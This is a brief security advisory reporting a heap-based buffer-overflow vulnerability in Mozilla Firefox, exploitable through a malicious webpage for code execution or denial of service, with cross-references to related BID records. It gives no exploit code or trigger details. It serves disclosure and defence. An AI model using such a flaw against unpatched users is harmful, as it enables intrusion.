Mozilla Firefox is prone to a heap-based buffer-overflow vulnerability.

An attacker can exploit this issue by tricking a victim into visiting a malicious webpage to execute arbitrary code and to cause denial-of-service conditions.

NOTE: This issue was previously covered in BID 36843 (Mozilla Firefox and SeaMonkey MFSA 2009-52 through -64 Multiple Vulnerabilities).

NOTE 2: This issue is related to BID 35510 (Multiple BSD Distributions 'gdtoa/misc.c' Memory Corruption Vulnerability), but because of differences in the code base, it is being assigned its own record.
